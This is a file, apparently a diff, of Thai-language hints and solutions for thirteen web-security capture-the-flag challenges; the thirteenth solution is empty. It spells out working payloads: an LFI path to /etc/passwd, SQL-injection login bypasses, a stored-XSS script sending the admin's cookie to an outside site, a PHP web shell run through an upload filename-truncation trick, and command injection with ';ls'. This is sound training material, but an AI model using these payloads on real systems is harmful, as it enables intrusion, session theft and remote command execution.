@@ -1,0 +1,102 @@
+#ch1 - 10pt
+hint
+    - ลองใช้ developer tools(f12) แล้วมองหาฟังก์ชันในไฟล์ JavaScript
+solution
+    - เมื่อใช้ developer tools จะเห็นว่าเมื่อกดปุ่ม login จะไปเรียกฟังก์ชัน authenticate ในไฟล์ /login.js จะเห็นว่ามีการเช็ค username, password ที่ฝังอยู่ใน JavaScript เมื่อนำไปใช้ จะได้ flag ออกมา
+
+
+#ch2 - 15pt
+hint
+    - ลองดูที่ URL ที่ลิงค์ไปดีๆสิ
+solution
+    - จะสังเกตได้ว่าเมื่อกดที่ปุ่ม facebook, twitter, youtube จะถูกพาไปยัง /redirect.php?url=... โดยหากเราเปลี่ยน parameter url จะทำให้ redirect ไปที่ URL ที่เราต้องการได้ จากโจทย์ให้ redirect ไปที่ "https://www.evil.c0m" เมื่อใส่ใน parameter url ก็จะพบกับ flag
+
+
+#ch3 - 30pt
+hint
+    - ลองใช้ โปรแกรม Burp Suite Community Edition เพื่อดัก HTTP request ที่ถูกส่งออกไปดูสิ (ref Burp tutorial)
+solution
+    - เมื่อดัก HTTP request ด้วย Burp จะเห็นว่ามี parameter score ถูกส่งออกไปใน body ของ request เมื่อทำการแก้ค่า parameter score ให้มากกว่า 100 แล้ว ส่งออกไป จะทำให้ได้ flag ของข้อนี้
+
+
+#ch4 - 15pt
+hint
+    - ลองสังเกตที่ URL parameter ดูอีกทีสิ
+solution
+    - จากการสังเกตที่ URL เราจะพบว่ามี parameter id อยู่ซึ่งเป็นตัวเลข ลองคิดดูว่าถ้าเราเปลี่ยนเป็นเลขอื่นจะเกิดอะไรขึ้น !? เราก็จะเห็น User infomation ของ user อื่นได้ คราวนี้ลองไล่ดูไปเรื่อย ๆ ก็จะพบข้อมูลของ admin ที่ id = 1 แล้วจะพบ flag ใน email ของ admin
+
+
+#ch5 - 50pt
+hint
+    - มีอะไรอยู่ใน Cookie หรือเปล่าน้า
+solution
+    - หน้าเว็บของด่านนี้จะแทบไม่มีอะไรเลย แต่เมื่อสังเกตดีๆ จะเห็นว่ามี Cookie ชื่อว่า user อยู่ มีค่าเป็น UmFscGg6Z3Vlc3Q= ซึ่งหากดูจาก format แล้วน่าจะเป็น Base64encoding เมื่อ decode ออกมาจะได้ Ralph:guest จากข้อความหน้าเว็บก็จะเดาได้ว่าต้องเป็น role admin ถึงจะเข้าถึงหน้านี้ได้ โดยให้เปลี่ยนจาก guest > admin ดังนี้ Ralph:guest > Ralph:admin แล้วนำไป Base64encoding และ set Cookie user เมื่อเข้าหน้าเว็บด้วย Cookie ใหม่ก็จะพบกับ flag 
+
+
+#ch6 - 30pt
+hint
+    - Directory listing คืออะไร?, รูปถูกเก็บอยู่ที่ไหน ?
+solution
+    - หน้าเว็บจะมีรูปมากมายแสดงอยู่ เมื่อเราดูที่ path ของรูปจะเห็นว่าอยู่ใน /images และ เมื่อทำความเข้าใจกับ Directory listing ก็จะพบว่าสามารถเข้าหน้า /images ได้และจะพบไฟล์ทั้งหมดที่อยู่ด้านใน จะเห็นว่ามีไฟล์ fl4g.txt ที่เก็บค่า flag ของข้อนี้อยู่
+
+
+#ch7 - 50pt
+hint
+    - substitution cipher
+solution
+    - จากโจทย์ จะให้ c3ludHszYVBlbGNnXzFmXzRfem5UdnB9 มาเมื่อนำไป Base64 decode จะได้ synt{3aPelcg_1f_4_znTvp} ซึ่งลักษณะคล้าย flag แต่ถูก encrypt ด้วย simple substitution ciphers ที่เรียกว่า Rot13 เป็นการ shift ตัวอักษรภาษาไป 13 ตัว เมื่อทำการ Base64 decode และ Rot13 ตามลำดับก็จะได้ flag ที่ซ่อนอยู่ออกมา
+
+
+#ch8 - 75pt
+hint
+    - บน URL parameter นั่นอะไรอะ ชื่อไฟล์หรอ?
+solution
+    - ด่านนี้หากสังเกตที่ URL เมื่อเรากดเปลี่ยนหน้า จะเปลี่ยนแค่ URL parameter ที่ชื่อว่า page เท่านั้น ซึ่งลักษณะเหมือนการ include file เข้ามา ดังนั้นจึงต้องลองทดสอบ Local file inclusion ด้วยการเซ็ตค่า page=../../../../../../../../../etc/passwd และ เมื่อสามารถทำ Local file inclusion ได้แล้วก็ไปอ่านไฟล์ ตามที่โจทย์บอกก็จะได้ flag
+
+
+#ch9 - 100pt
+hint
+    - try qoute'
+solution
+    - หน้านี้เป็นหน้า login ที่มีการเชื่อมต่อกับฐานข้อมูล จึงทำการทดสอบด้วยการใส่ single qoute ' ไปใน input จะพบว่ามี error mysql เกิดขึ้น เมื่อทำการศึกษาต่อไป จะพบว่าเราสามารถ bypass authentication ได้ด้วยการใส่ ' or '1' = '1 หรือ ' or 1=1 -- - และเมื่อล็อคอินผ่านก็จะพบกับ flag ของข้อนี้
+
+
+#ch10 - 200pt
+hint
+    - ทำให้ admin ส่ง Cookie ของเขามาเว็บเราผ่านทาง URL โดยใช้ JS ดูสิ !
+solution
+    - เป้าหมายของข้อนี้คือการขโมย Cookie ของ admin ให้ได้ ซึ่งหน้าเว็บมีฟังก์ชันสามารถโพสข้อความได้ ซึี่งสามารถโพสอะไรก็ได้ใน format HTML ไม่ว่าจะเป็น image, paragraph, header หรือแม้กระทั่ง script (JS) !! ทำให้มีช่องโหว่ Stored XSS โดยการที่จะขโมย Cookie ของ admin ได้นั้นทำได้หลากหลายท่า เราจะเฉลยหนึ่งในนั้น คือการให้ admin redirect ไปที่เว็บที่เราต้องการพร้อมกับ Cookie ของเขา Payload ดังนี้
+    <script>
+        window.location = "http://www.mysite.com/" + document.cookie;
+    </script>
+รอสักครู่แล้วไปดู log flag ซึ่งอยู่ใน Cookie ก็จะติดมากับ request นั้นๆ เป็นอันจบ เย่
+
+
+#ch11 150pt
+hint
+    - จะเกิดอะไรขึ้นถ้าอัพไฟล์มากกว่า 40 ตัวอักษร ? แล้วถ้าอัพไฟล์ที่ไม่ใช่รูปล่ะ ?
+solution
+    - ข้อนี้มีการอัพโหลดไฟล์อยู่ เมื่อกดอัพโหลด ก็จะอัพโหลดได้แต่รูป แต่นั่นคือฝั่ง client เราจึงต้องดัก request upload ใน Burp แก้ไข filename และ content ให้เป็น php shell เช่น
+
+    //shell.php
+    <?php system($_GET['cmd']); ?>
+
+    แต่ก็ยังติดที่นามสกุลไฟล์ไม่ใช่ไฟล์รูป กลับไปดูโจทย์ดี ๆ อีกรอบ เมื่อเราสังเกตดู หน้าเว็บบอกว่าชื่อไฟล์จำกัดแค่ 40 ตัว ถ้าอัพมากกว่านั้นจะทำให้ชื่อไฟล์ที่เกินถูกตัดออก!! มาถึงตรงนี้บางคนอาจจะคิดออกแล้ว นั่นคือ อัพไฟล์ ที่มีชื่อ เกิน 40 ตัวและให้ตัดนามสกุลที่เป็น ของรูปออก แล้วก็เหลือไว้แค่ .php เช่น "123456789012345678901234567890123456.php.png" เป็นต้น
+    หลังจากนั้นก็เข้าไป รัน os command เพื่อดูว่า flag อยู่ไหน จะพบว่าอยู่ที่ path ../flag_ch11.txt แล้ว cat ../flag_ch11.txt file อ่านมันออกมา จบ ง่าย ๆ ใช่ไหม ^^
+
+
+#ch12 150pt
+hint
+    - อะไรที่ทำให้สามารถรัน os command หลาย ๆ คำสั่งได้ในครั้งเดียว (ปล. ไม่เห็นไม่ได้แปลว่าไม่มีอยู่)
+solution
+    - หน้านี้จะมีการนำชื่อ URL ไปรันคำสั่ง curl ซึ่งหากนำไปต่อ string แล้วรัน command ก็จะเกิดช่องโหว่ขึ้น โดยสามารถใส่ ;, &, &&, | เป็นต้น แล้วตามด้วย os command ต่าง ๆ (ในที่นี้คือ Linux command) เช่น
+    "https://www.facebook.com/;ls" ก็จะรัน command "ls" หรือ จะตัดให้เหลือแค่
+    ";ls" ก็จะรัน command "ls" เหมือนกัน
+    คราวนี้ จะพบว่ามี folder flag อยู่เข้าไปก็จะต้อง ls -a ถึงจะเจอไฟล์ .flag.txt 
+    ให้ cat flag/.flag.txt ออกมาก็จะพบกับ flag ของข้อนี้
+
+#ch13 175pt
+hint
+    - อะไรอยู่ข้างใน redeem code ,มันเขียนไฟล์ได้ ?! (keyword: php deserialization)
+solution
+    - 
